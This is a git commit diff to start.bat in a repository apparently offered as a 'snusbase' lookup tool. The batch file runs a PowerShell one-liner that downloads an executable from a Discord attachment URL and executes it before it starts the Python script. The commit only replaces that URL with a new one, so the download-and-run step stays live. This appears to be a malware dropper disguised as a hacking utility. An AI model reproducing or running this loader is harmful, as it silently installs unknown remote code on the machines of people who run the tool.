91434a357f44c9909076fd36e7b35d640105b7e0
IWcommunityHackTool <153363674+IWcommunityHackTool@users.noreply.github.com>
2024-01-11 23:01:51 +0100

    Update start.bat

--- snusbase-tool/start.bat
+++ snusbase-tool/start.bat
@@ -1,5 +1,5 @@
 @echo off
 cd src
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1195109113198301254/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1195125209041211452/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 py main.py
 Key : 01266156
